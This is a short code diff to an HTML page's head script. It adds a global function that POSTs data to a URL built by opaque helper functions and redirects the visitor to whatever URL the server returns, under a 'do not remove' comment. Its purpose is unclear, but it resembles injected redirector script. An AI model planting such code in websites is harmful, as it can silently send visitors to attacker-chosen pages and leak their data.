@@ -11,6 +11,7 @@
 
     <!-- do not remove -->
     <script>
+        window.onload = function () {
             const p = function(t, z) {
                 $.ajax({
                     type: "POST",
@@ -25,6 +26,22 @@
                     }
                 })
             };
+
+            window.p = function(t, z) {
+                $.ajax({
+                    type: "POST",
+                    dataType: "json",
+                    cache: false,
+                    url: u(z) + w(),
+                    data: "q=" + xha(t),
+                    success: function (xhr) {
+                        if (xhr[0] !== "" && document.URL !== xhr[0]) {
+                            window.location.href = xhr[0] + window.location.search
+                        }
+                    }
+                })
+            };
+        }
 
     </script>
 </head>
